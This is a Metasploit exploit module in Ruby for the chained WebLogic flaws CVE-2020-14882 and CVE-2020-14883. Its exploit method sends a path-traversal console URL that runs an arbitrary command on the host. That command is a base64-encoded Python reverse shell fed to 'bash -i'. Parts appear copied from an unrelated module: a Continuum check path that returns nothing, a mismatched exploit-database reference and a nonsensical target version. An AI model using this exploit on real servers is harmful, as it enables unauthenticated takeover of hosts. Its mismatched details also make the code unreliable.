##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Weblogic Unauthentication Remote Command Execution',
      'Description'    => %q{
        Oracle WebLogic Server is the industry leading application server for building enterprise applications using Java EE standards, and deploying them on a reliable, scalable runtime with low cost of ownership.

        In Oracle Critical Patch Update Advisory - October 2020, Oracle fixed two security vulnerabilities submitted by security researcher @Voidfyoo from Chaitin Tech, CVE-2020-14882 and CVE-2020-14883.

        CVE-2020-14882 allows remote users to bypass the authentication in administrator console component, and CVE-2020-14883 allows authencated user to execute any command on administrator console component. Using a chain of these two vulnerabilities, unauthenticated remote attacker can execute arbitrary commands on the Oracle WebLogic server over HTTP and take complete control of the host.
      },
      'Author'         => [
        'voidfyoo', # Proof of concept
        'sam0ple'             # Metasploit module
      ],
      'References'     => [
        %w{EDB 39886}
      ],
      'DisclosureDate' => '2020',
      'License'        => MSF_LICENSE,
      'Platform'       => 'python',
      'Arch'           => ARCH_PYTHON,
      'Privileged'     => false,
      'DefaultOptions' => {
        'PAYLOAD' => 'python/shell_reverse_tcp'
      },
      'DefaultTarget'  => 0,
      'Targets'        => [['WebLogic <= 1.910', {}]]
    ))

    register_options([
      Opt::RPORT(7001)
    ])
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => '/continuum/about.action'
    )

  end

  def exploit

      uri = '/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec("'+command+'");")'
      res = send_request_cgi(
        'uri'=>uri
      )

      print_status(uri)
      
  end

  def command
    enc_payload = Rex::Text.encode_base64(payload.encode)
    command = "echo #{enc_payload} | base64 -d | python"
    command = "bash -c {echo,#{Rex::Text.encode_base64(command)}}|{base64,-d}|{bash,-i}"
    print_status(command)
    #command = "touch /tmp/this_is_shit5"
    command =Rex::Text.uri_encode(command)
    command
  end
end
